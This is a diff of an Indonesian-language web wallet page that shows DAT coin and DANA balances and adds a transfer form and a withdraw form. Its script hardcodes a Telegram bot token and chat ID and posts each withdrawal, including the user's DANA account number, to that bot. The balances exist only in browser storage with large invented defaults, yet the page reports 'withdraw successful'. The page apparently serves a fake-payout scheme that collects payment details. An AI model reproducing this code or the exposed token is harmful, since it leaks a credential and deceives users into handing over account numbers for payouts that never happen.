@@ -3,93 +3,298 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Dompet Koin DAT</title>
+  <title>Dompet Saya</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #111;
-      color: #fff;
       margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f3f3f3;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
       padding: 20px;
     }
 
-    .card {
-      background-color: #222;
+    .wallet-card {
+      background: linear-gradient(135deg, #ff6f00, #ff8f00);
+      color: white;
       border-radius: 16px;
-      padding: 20px;
+      padding: 24px;
+      width: 90%;
       max-width: 400px;
-      margin: 0 auto;
-      box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
+      box-shadow: 0 8px 16px rgba(0,0,0,0.1);
+      margin-bottom: 30px;
     }
 
-    .card h2 {
+    .wallet-card h2 {
       margin-top: 0;
-    }
-
-    input, button {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border: none;
-      border-radius: 8px;
-    }
-
-    input {
-      background-color: #333;
-      color: #fff;
-    }
-
-    button {
-      background-color: #0ff;
-      color: #000;
-      font-weight: bold;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #0cc;
-    }
-
-    .notif {
-      margin-top: 10px;
-      padding: 10px;
-      background-color: #0a0;
-      color: #fff;
-      border-radius: 6px;
-      display: none;
+      font-size: 22px;
+      margin-bottom: 16px;
       text-align: center;
+    }
+
+    .balance {
+      display: flex;
+      justify-content: space-between;
+      margin: 12px 0;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .balance span {
+      font-weight: normal;
+      font-size: 14px;
+    }
+
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.5);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .withdraw-modal {
+      background: white;
+      width: 90%;
+      max-width: 400px;
+      border-radius: 16px;
+      padding: 24px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+    }
+
+    .form-group {
+      width: 100%;
+      margin-bottom: 16px;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+
+    .button-group {
+      display: flex;
+      gap: 12px;
+      margin-top: 24px;
+    }
+
+    .withdraw-button, .submit-button, .cancel-button, .back-btn {
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    .withdraw-button {
+      background: #1976d2;
+      color: white;
+      max-width: 400px;
+      margin-top: 20px;
+    }
+
+    .submit-button {
+      background: #1976d2;
+      color: white;
+      flex: 1;
+    }
+
+    .cancel-button {
+      background: #f0f0f0;
+      color: #333;
+      flex: 1;
+    }
+
+    .back-btn {
+      background: #333;
+      color: white;
+      max-width: 400px;
+      margin-top: 20px;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      margin-top: 40px;
+    }
+
+    #notifikasi {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #4caf50;
+      color: white;
+      padding: 14px 24px;
+      border-radius: 8px;
+      font-size: 16px;
+      z-index: 2000;
+      display: none;
+      animation: fadeInOut 4s ease-in-out forwards;
+    }
+
+    @keyframes fadeInOut {
+      0% { opacity: 0; transform: translate(-50%, -20px); }
+      10%, 90% { opacity: 1; transform: translate(-50%, 0); }
+      100% { opacity: 0; transform: translate(-50%, -20px); }
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>Saldo DAT Kamu</h2>
-    <p id="saldoDAT">0 DAT</p>
 
-    <h3>Kirim Koin DAT ke Teman</h3>
-    <input type="email" id="emailTujuan" placeholder="Alamat Email Penerima" />
-    <input type="number" id="jumlahTransfer" placeholder="Jumlah Koin DAT" />
-    <button onclick="prosesTransferEmail()">Kirim Koin</button>
+  <div id="notifikasi"></div>
 
-    <div class="notif" id="notifBerhasil">Transfer berhasil!</div>
+  <div class="wallet-card">
+    <h2>Dompet Saya</h2>
+    <div class="balance">DAT: <span id="saldoDAT">-</span></div>
+    <div class="balance">DANA: <span id="saldoDANA">-</span></div>
   </div>
 
+  <button class="withdraw-button" onclick="tampilkanForm()">Withdraw</button>
+
+  <div id="modalWithdraw" class="modal-overlay">
+    <div class="withdraw-modal">
+      <h3>Withdraw</h3>
+      <div class="form-group">
+        <label>Jumlah Poin yang ingin diwithdraw</label>
+        <input type="number" id="jumlahWithdraw" placeholder="Masukkan jumlah">
+      </div>
+      <div class="form-group">
+        <label>Nomor Dana kamu</label>
+        <input type="text" id="nomorDana" placeholder="Masukkan nomor DANA">
+      </div>
+      <div class="button-group">
+        <button class="submit-button" onclick="submitWithdraw()">Submit Withdraw</button>
+        <button class="cancel-button" onclick="sembunyikanForm()">Batal</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Form Kirim Koin DAT -->
+  <div style="max-width: 400px; margin: 30px auto; padding: 20px; border: 1px solid #ccc; border-radius: 10px;">
+    <h3>Kirim Koin DAT</h3>
+    <label for="emailTujuan">Email Penerima</label>
+    <input type="email" id="emailTujuan" placeholder="Contoh: userlain@gmail.com" style="width: 100%; padding: 10px; margin: 10px 0;" />
+    <label for="jumlahTransfer">Jumlah DAT</label>
+    <input type="number" id="jumlahTransfer" placeholder="Contoh: 1000" style="width: 100%; padding: 10px; margin: 10px 0;" />
+    <button onclick="prosesTransferEmail()" style="width: 100%; padding: 10px; background-color: #1abc9c; color: white; border: none; border-radius: 5px;">Kirim</button>
+  </div>
+
+  <button class="back-btn" onclick="window.location.href='dashboard.html'">Kembali</button>
+  <div class="footer">© 2025 Dompet Digital</div>
+
   <script>
-    const username = localStorage.getItem("username") || "user_default";
+    const telegramToken = '8302323286:AAEM6xferO3kn5Bfx9Gc1tNu2iGeDEhXdr4';
+    const telegramChatId = '5788541286';
+
+    const username = localStorage.getItem("currentUser") || "user";
     let saldoDAT = parseFloat(localStorage.getItem(username + "_totalReward") || "44916900");
+    let saldoDANA = parseFloat(localStorage.getItem(username + "_totalDANA") || "375");
+
     document.getElementById("saldoDAT").textContent = saldoDAT.toLocaleString('id-ID') + " DAT";
+    document.getElementById("saldoDANA").textContent = saldoDANA.toLocaleString('id-ID') + " DANA";
+
+    function tampilkanForm() {
+      document.getElementById("modalWithdraw").style.display = "flex";
+    }
+
+    function sembunyikanForm() {
+      document.getElementById("modalWithdraw").style.display = "none";
+    }
+
+    function tampilkanNotifikasi(pesan) {
+      const notif = document.getElementById("notifikasi");
+      notif.textContent = pesan;
+      notif.style.display = "block";
+      setTimeout(() => {
+        notif.style.display = "none";
+      }, 4000);
+    }
+
+    function kirimTelegramPesan(teks) {
+      const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+      const data = {
+        chat_id: telegramChatId,
+        text: teks,
+        parse_mode: 'Markdown'
+      };
+
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      }).then(res => res.json()).then(res => {
+        console.log("Pesan Telegram dikirim:", res);
+      }).catch(err => {
+        console.error("Gagal kirim Telegram:", err);
+      });
+    }
+
+    function submitWithdraw() {
+      const jumlah = parseFloat(document.getElementById("jumlahWithdraw").value);
+      const nomorDana = document.getElementById("nomorDana").value.trim();
+
+      if (isNaN(jumlah) || jumlah <= 0) {
+        alert("Masukkan jumlah yang valid.");
+        return;
+      }
+
+      if (!nomorDana) {
+        alert("Nomor akun DANA tidak boleh kosong.");
+        return;
+      }
+
+      if (jumlah > saldoDANA) {
+        alert("Saldo DANA tidak mencukupi.");
+        return;
+      }
+
+      saldoDANA -= jumlah;
+      localStorage.setItem(username + "_totalDANA", saldoDANA);
+      document.getElementById("saldoDANA").textContent = saldoDANA.toLocaleString('id-ID') + " DANA";
+
+      tampilkanNotifikasi("✅ Withdraw berhasil diproses!");
+      sembunyikanForm();
+
+      const pesan = `📤 *Withdraw Baru!*\n👤 User: *${username}*\n💰 Jumlah: *${jumlah} DANA*\n📱 Nomor DANA: *${nomorDana}*`;
+      kirimTelegramPesan(pesan);
+    }
 
     function prosesTransferEmail() {
       const emailTujuan = document.getElementById("emailTujuan").value.trim().toLowerCase();
       const jumlah = parseFloat(document.getElementById("jumlahTransfer").value);
 
       if (!emailTujuan || isNaN(jumlah) || jumlah <= 0) {
-        alert("Masukkan email dan jumlah yang valid.");
+        alert("Isi email dan jumlah DAT dengan benar.");
         return;
       }
 
-      if (!localStorage.getItem(emailTujuan + "_totalReward")) {
-        alert("Email tidak ditemukan di sistem.");
+      if (emailTujuan === username.toLowerCase()) {
+        alert("Tidak bisa mengirim ke diri sendiri.");
+        return;
+      }
+
+      const penggunaTujuan = localStorage.getItem(emailTujuan + "_totalReward");
+      if (penggunaTujuan === null) {
+        alert("Email penerima tidak ditemukan.");
         return;
       }
 
@@ -98,51 +303,17 @@
         return;
       }
 
-      // Log untuk debugging
-      console.log("Saldo sebelum:", saldoDAT);
-      console.log("Jumlah transfer:", jumlah);
-      console.log("Saldo sesudah:", saldoDAT - jumlah);
-
-      // Proses pengurangan saldo pengirim
       saldoDAT -= jumlah;
+      const saldoTujuan = parseFloat(penggunaTujuan) + jumlah;
+
       localStorage.setItem(username + "_totalReward", saldoDAT);
+      localStorage.setItem(emailTujuan + "_totalReward", saldoTujuan);
 
-      // Proses penambahan saldo penerima
-      const saldoPenerima = parseFloat(localStorage.getItem(emailTujuan + "_totalReward") || "0");
-      const saldoBaruPenerima = saldoPenerima + jumlah;
-      localStorage.setItem(emailTujuan + "_totalReward", saldoBaruPenerima);
-
-      // Update tampilan saldo pengirim
       document.getElementById("saldoDAT").textContent = saldoDAT.toLocaleString('id-ID') + " DAT";
+      tampilkanNotifikasi(`✅ Berhasil kirim ${jumlah} DAT ke ${emailTujuan}`);
 
-      // Tampilkan notifikasi
-      const notif = document.getElementById("notifBerhasil");
-      notif.style.display = "block";
-      notif.textContent = "Berhasil kirim " + jumlah + " DAT ke " + emailTujuan;
-
-      // Bersihkan input
-      document.getElementById("emailTujuan").value = "";
-      document.getElementById("jumlahTransfer").value = "";
-
-      // Kirim notifikasi ke Telegram
-      const telegramToken = "8302323286:AAEM6xferO3kn5Bfx9Gc1tNu2iGeDEhXdr4";
-      const chatId = "5788541286";
-      const pesan = `📤 Transfer DAT\nDari: ${username}\nKe: ${emailTujuan}\nJumlah: ${jumlah.toLocaleString('id-ID')} DAT\n\nSisa saldo: ${saldoDAT.toLocaleString('id-ID')} DAT`;
-
-      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: pesan
-        })
-      }).then(res => res.json()).then(data => {
-        console.log("Notifikasi Telegram terkirim:", data);
-      }).catch(err => {
-        console.error("Gagal kirim ke Telegram:", err);
-      });
+      const pesan = `📤 *Transfer Koin DAT*\n👤 Pengirim: *${username}*\n📧 Penerima: *${emailTujuan}*\n💸 Jumlah: *${jumlah} DAT*`;
+      kirimTelegramPesan(pesan);
     }
   </script>
 </body>
